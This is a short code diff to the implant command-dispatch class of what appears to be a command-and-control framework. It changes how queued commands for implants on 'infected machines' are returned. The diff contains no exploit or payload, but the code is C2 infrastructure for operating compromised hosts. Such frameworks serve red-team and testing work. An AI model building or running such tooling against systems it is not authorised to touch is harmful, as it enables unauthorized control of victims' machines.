@@ -18,6 +18,7 @@ class ImplantSingleton:
             if UIK != 0:
                 # -- Issue command based on unique implant identifiers (UIK)
                 # -- UIK is embedded into the implant via Jinja on delivery.
+                # TODO
 
                 # BUG: If the X-Header is mangled this errors.
                 ImplantObj=db.implant.Get_GeneratedImplantDataFromUIK(UIK)
@@ -34,14 +35,14 @@ class ImplantSingleton:
                         Entry = min(tmpImpLogs, key=lambda x: x.time)
                         if db.implant.Register_ImplantCommandPickup(Entry, c2_protocol):
                             # Entry.log_entry is currently cast to a string at this stage.
-                            return ast.literal_eval(Entry.log_entry)
+                            return ast.literal_eval(Entry.log_entry), Entry.command_id
 
             # -- Create a suitable null response.
             # --    This may be a random value, depending on how the implant handles it.
 
-                return "=="
+                return None, None
             else:
-                return "=="
+                return None, None
 
         # -- Used by Implant - Logs command responses from infected machines.
         def CommandResponse(self,unique_implant_key , cmd_result, c2_protocol=None):
